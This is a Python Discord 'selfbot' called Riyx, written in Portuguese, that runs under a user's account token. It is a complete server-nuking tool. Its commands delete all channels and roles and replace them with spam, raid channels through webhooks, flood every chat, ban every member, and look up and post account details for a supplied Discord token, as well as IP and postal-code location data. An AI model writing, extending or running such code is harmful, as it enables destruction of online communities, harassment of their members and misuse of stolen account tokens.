import os, json
from time import sleep
clear = lambda: os.system("clear")

libs = ("python-discord", "requests", "colorama", "pyfiglet")

try:
	import discord, requests, pyfiglet
	from discord.ext import commands
	from colorama import Fore
except:
	print("Instalando Bibliotecas, Aguarde!")
	sleep(1)
	for lib in libs:
		os.system(f"pip install {lib}")
		
	import discord, requests, pyfiglet
	from discord.ext import commands
	from colorama import Fore
	
vermelho = Fore.RED
verde = Fore.GREEN
ciano = Fore.CYAN
roxo = Fore.MAGENTA
reset = Fore.RESET

add1 = reset + f"[{verde}+{reset}]"
add2 = reset + f"[{ciano}+{reset}]"
add3 = reset + f"[{roxo}+{reset}]"
a1 = reset + f"[{verde}!{reset}]"
a2 = reset + f"[{ciano}!{reset}]"
a3 = reset + f"[{roxo}!{reset}]"
m1 = reset + f"[{vermelho}-{reset}]"
pergunta1 = reset + f"[{ciano}?{reset}]"
pergunta2 = reset + f"[{vermelho}?{reset}]"
	
def banner(nome="banner", x=15):
	return pyfiglet.figlet_format(nome.center(x))
	
print(roxo + banner("Riyx", 30) + reset)

print(f"{roxo}Criado Por:{vermelho} HunterDep\n{roxo}YouTube: {vermelho}https://youtube.com/channel/UCyo1KzxCt9iJybQPFXmMOPg\n{roxo}GitHub: {vermelho}https://github.com/HunterDep\n")

token = input(f"{add2} {ciano}Token: {roxo}")
prefixo = input(f"{add2} {ciano}Prefixo: {roxo}")
logs = input(f"{pergunta1} {ciano}Logs (s/n): {roxo}").strip().lower()[0]

if not logs in "syn":
	print(f"{pergunta2}{ciano} Não Entendi! O Logs Vai ser {verde}Sim{reset}!")
	logs = "s"
	
print(f"\n{a3} {roxo}Conectando...{reset}")

intents = discord.Intents.all()

riyx = commands.Bot(command_prefix=prefixo, intents=intents, self_bot=True)

@riyx.event
async def on_ready():
	clear()
	
	print(roxo + banner("Riyx", 30) + reset)
	print(f"{roxo}Criado Por:{vermelho} HunterDep\n{roxo}YouTube: {vermelho}https://youtube.com/channel/UCyo1KzxCt9iJybQPFXmMOPg\n{roxo}GitHub: {vermelho}https://github.com/HunterDep\n")
	
	print(f"{add1} {verde}Conectado Em: {roxo}{riyx.user}")
	print(f"{add1} {verde}Comando de Ajuda: {roxo}{prefixo}ajuda")
	print(f"{add1} {verde}Versão: {roxo}V1")
	
	if logs in "sy":
		print(f"{add1} {verde}Logs: {roxo}Ativado!\n")
	else:
		print(f"{add1} {verde}Logs: {vermelho}Desativado!{reset}\n")
		
@riyx.command(name="ajuda")
async def ajuda(ctx):
	await ctx.message.delete()
	texto = f"""
**__Riyx SelfBot__**

**__Comandos de Nuke__**: 
```
	{prefixo}nc < número > < nome >: Nuke de Canais
	
	{prefixo}nr < número > < nome >: Nuke de Cargos
	
	{prefixo}webnuker: Raid de Webhooks no Servidor ||Configuração do comando no arquivo em JSON||
	
	{prefixo}chats < número > < mensagem >: Vai mandar o total de vezes as mensagens que você escolher
	
	{prefixo}banall: Bane Todos os Membros```
	
**__Comandos de Consulta__**:
```
	{prefixo}tokeninfo < token >: Informações do Token
	{prefixo}cepinfo < cep >: Informações do CEP
	{prefixo}ipinfo < ip >: Informações do IP
```
	"""
	await ctx.send(texto)
	
	if logs in "sy":
		
		print(f"{add3} {ciano}Comando Ajuda!{reset}")
		
@riyx.command(name="nc")
async def nc(ctx, n=20, *m):
	await ctx.message.delete()
	m = " ".join(m)
	
	if not m:
		m = "🤬 riyx selfbot"
		
	if logs in "sy":
		print(f"{add3} {ciano}Comando NC!{reset}")
		
	for canal in ctx.guild.channels:
		try:
			await canal.delete()
			if logs in "sy":
				print(f"{m1} {roxo}Deletando o Canal: {vermelho}{canal}{reset}")
		except:
			if logs in "sy":
				print(f"{m1} {roxo}Erro ao Deletar o Canal: {vermelho}{canal}{reset}")
			
	for canais in range(1, int(n)+1):
		try:
			await ctx.guild.create_text_channel(m)
			if logs in "sy":
				print(f"{add1} {roxo}Criei {verde}{canais}{roxo} Canais!{reset}")
		except:
			if logs in "sy":
				print(f"{m1} Error! Verifique se você tem Permissão Para Deletar Canais!")
			
	if logs in "sy":
		print(f"{add3} {roxo}Ataque Finalizado!{reset}")
		
		
@riyx.command(name="nr")
async def nr(ctx, n=20, *m):
	
	if logs in "sy":
		print(f"{add3} {ciano}Comando NR{reset}")
	await ctx.message.delete()
	
	m = " ".join(m)
	
	if not m:
		m = "🤬 Riyx SelfBot"
		
	for cargo in ctx.guild.roles:
		try:
			await cargo.delete()
			if logs in "sy":
				print(f"{m1} {roxo}Deletei o Cargo: {vermelho}{cargo}{reset}")
		except:
			if logs in "sy":
				print(f"{m1} {roxo}Erro ao Deletar o Cargo: {vermelho}{cargo}{reset}")
			
	for cargos in range(1, int(n)+1):
		try:
			await ctx.guild.create_role(name=m)
			if logs in "sy":
				print(f"{add1} {roxo}Criei {verde}{cargos} {roxo}Cargos!{reset}")
		except:
			if logs in "sy":
				print(f"{m1} Error! Verifique se você tem Permissão Para Criar Cargos!")
		
	if logs in "sy":
		print(f"{add3}{roxo}Ataque Finalizado!{reset}")
		
@riyx.command(name="webnuker")
async def webnuker(ctx):
	await ctx.message.delete()
		
	if logs in "sy":
		print(f"{add3} {ciano}Comando WebNuker!{reset}")
		
	arqv = open("webnuker.json")
	dict = json.load(arqv)
	
	for canal in ctx.guild.channels:
		for x in range(dict["total"]):
			try:
				webhook = await ctx.channel.create_webhook(name=dict["nome"])
			
				await webhook.send(dict["mensagem"])
				
				if logs in "sy":
					print(f"{add1}{verde} Chat {roxo}{canal}{verde} Raidado!{reset}")
					
			except:
				if logs in "sy":
					print(f"{m1}{vermelho} Erro ao Raidar o Chat {roxo}{canal}{vermelho}!{reset}")
					continue
		
@riyx.command(name="chats")
async def chats(ctx, n=5, *m):
	
	await ctx.message.delete()
	
	m = " ".join(m)
	
	if logs in "sy":
		print(f"{add3}{ciano} Comando Chats!{reset}")
	
	if not m:
		m = "🤬 Riyx SelfBot"
		
	for canal in ctx.guild.channels:
		try:
			for x in range(int(n)):
				await canal.send(m)
			if logs in "sy":
				print(f"{add1}{verde} Chat {roxo}{canal}{verde} Raidado!{reset}")
		except:
			if logs in "sy":
				print(f"{m1}{vermelho} Erro ao Spamar no Chat {roxo}{canal}{vermelho}!{reset}")
		
@riyx.command(name="banall")
async def banall(ctx):
	
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {ciano}Comando BanAll{reset}")
		
	for membros, membro in enumerate(ctx.guild.members):
		try:
			await membro.ban()
			if logs in "sy":
				print(f"{m1} {roxo}Membro Banido: {vermelho}{membro}")
		except:
				if logs in "sy":
					print(f"{m1} {roxo}Error ao Banir o Usuário: {vermelho}{membro}!{reset}")
					
	if logs in "sy":
		print(f"{add1} {roxo}Eu bani {vermelho}{membros}{roxo} Membros!{reset}")
				
@riyx.command(name="tokeninfo")
async def token_info(ctx, token):
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {ciano}Comando TokenInfo!{reset}")
	
	req = requests.get("https://discord.com/api/v6/users/@me", headers={"Authorization": token}).json()
	infos = []
	
	for chave, valor in req.items():
		infos.append(f"[{chave[0].upper() + chave[1:]}] {valor}")
	infos.append(f"[Token] {token}")
	infos = "\n".join(infos)
	
	await ctx.send(infos)
	
@riyx.command(name="cepinfo")
async def cepinfo(ctx, cep):
	
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {ciano}Comando CEPInfo!{reset}")
	
	cep = cep.replace("+", ""); cep = cep.replace("-", ""); cep = cep.replace(".", "")
	
	req = requests.get(f"https://viacep.com.br/ws/{cep}/json/").json()
	infos = []
	for chave, valor in req.items():
		infos.append(f"[{chave[0].upper() + chave[1:]}] {valor}")
	infos = "\n".join(infos)
	
	await ctx.send(infos)
	
@riyx.command(name="ipinfo")
async def ipinfo(ctx, ip):
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {ciano}Comando IPInfo!{reset}")
	
	req = requests.get(f"http://ip-api.com/json/{ip}").json()
	infos = []
	for chave, valor in req.items():
		infos.append(f"[{chave[0].upper() + chave[1:]}] {valor}")
	infos = "\n".join(infos)
	
	await ctx.send(infos)
				
try:
	riyx.run(token, bot=False)
except Exception as Error:
	clear()
	print(f"{a3} {roxo} Error Detectado: {vermelho}{Error}")
